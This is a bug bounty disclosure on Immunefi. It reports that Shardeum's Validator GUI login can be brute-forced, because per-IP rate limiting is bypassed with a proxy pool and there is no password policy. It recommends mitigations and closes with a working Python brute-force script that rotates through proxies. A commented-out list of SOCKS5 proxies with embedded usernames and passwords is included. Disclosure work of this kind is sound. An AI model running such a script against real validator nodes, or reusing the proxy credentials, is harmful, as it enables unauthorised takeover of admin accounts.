# Boost \_ Shardeum\_ Ancillaries 33392 - \[Websites and Applications - Insight] Validator GUI password b

Submitted on Fri Jul 19 2024 10:44:51 GMT-0400 (Atlantic Standard Time) by @anton\_quantish for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #33392

Report type: Websites and Applications

Report severity: Insight

Target: <https://github.com/shardeum/validator-gui/tree/dev>

Impacts:

* Taking state-modifying authenticated actions (with or without blockchain state interaction) on behalf of other users without any interaction by that user, such as: Changing registration information, Commenting, Voting, Making trades, Withdrawals, etc.

## Description

Hey Shardeum team,

## Brief/Intro

The only password-bruteforce protection the Validator GUI has is the IP rate-limiting. This protection could be easily bypassed by using a pool of proxy-servers and, thus, the attacker can successfully guess the admin password in a very short time (depending of the password complexity).

## Vulnerability Details

First of all, there's no password policy the Validator GUI/CLI have at all. The node admin can easily set the password like "1" or something similar and, in such a case, the attacker would be able to immediately guess it using just his/her own IP address.

Then, if the password set is more complex, the only bruteforce-protection the Validator has is the rate-limiting of source IP address. This protection could easily be bypassed by an attacker using a pool of proxy servers.

* If the password uses lowercase letters and digits only, for example, and has a length of 6 chars, the whole variety of combinations is 36^6 \~= 2.17 billions.
* Every IP address can make 1500 API calls per 10 minutes.

Thus, it'd take just

```
((2.17*10**9 passwords) / (150 passwords per minute) / 10000 IPs)
= 1446 minutes ~= 24 hours
```

to guess such a password using 10000 proxy servers (which is absolutely realistic).

It would be much easily to guess one in case of using the password dictionaries.

If the password is more complex, an attacker can use more proxy servers and/or wait more.

## Impact Details

After the successful password guess, the attacker will be able to sign in to GUI and do anything the admin can.

## Mitigation

1. First of all, I highly recommend you to set some default password policy like at least having a digit, a letter and a char, and a length of at least 8 symbols.
2. It wouldn't absolutely mitigate the issue though because users often use passwords like "Shardeum2024!". That's why I recommend you to set up a CAPTCHA on login page. It can also be bypassed but it would take a lot of either time or money from the attacker to successfully guess a password in such a case. If you don't want to show the CAPTCHA always, you can show it for EVERY IP address in case of there was 3 failed login attempts from ANY IP in some time window for instance.

## Proof of concept

## Proof of Concept

You can use the following python script to perform the password bruteforce using proxies (I commented them to be able to test it on my local installation but you can try it with your own external setup and make sure the bruteforcing works).

```python
import asyncio
from hashlib import sha256

from httpx import AsyncClient


AUTH_ENDPOINT = 'http://172.16.205.128:8081/auth/login'  # use the external IP here

# PROXIES = '''socks5://svqghgoq:5t7s4aabgbkr@45.127.248.127:5128
# socks5://svqghgoq:5t7s4aabgbkr@207.244.217.165:6712
# socks5://svqghgoq:5t7s4aabgbkr@134.73.69.7:5997
# socks5://svqghgoq:5t7s4aabgbkr@64.64.118.149:6732
# socks5://svqghgoq:5t7s4aabgbkr@157.52.253.244:6204
# socks5://svqghgoq:5t7s4aabgbkr@167.160.180.203:6754
# socks5://svqghgoq:5t7s4aabgbkr@166.88.58.10:5735
# socks5://svqghgoq:5t7s4aabgbkr@173.0.9.70:5653
# socks5://svqghgoq:5t7s4aabgbkr@204.44.69.89:6342
# socks5://svqghgoq:5t7s4aabgbkr@173.0.9.209:5792'''.splitlines()

PROXIES = []


# passwords_to_try = (str(i) for i in range(100000, 200000))
passwords_to_try = iter(['5', '4', '3', '2', '1'])


async def worker(proxy):
	client = AsyncClient(proxies=proxy)
	while True:
		try:
			password = next(passwords_to_try)
		except StopIteration:
			break
		password_hash = sha256(password.encode('utf8')).hexdigest()
		resp = await client.post(AUTH_ENDPOINT, json={
			'password': password_hash
		})
		if resp.status_code != 403:
			print('!!!', 'password found', password)
		else:
			print('password invalid', password)
		await asyncio.sleep(0.4)  # sleep 0.4 sec to not be rate-limited (600s/1500 = 0.4s)


async def main():
	tasks = [worker(p) for p in PROXIES]
	tasks.append(worker(None))  # use attacker's own IP as well
	await asyncio.gather(*tasks)


if __name__ == '__main__':
	asyncio.run(main())

```
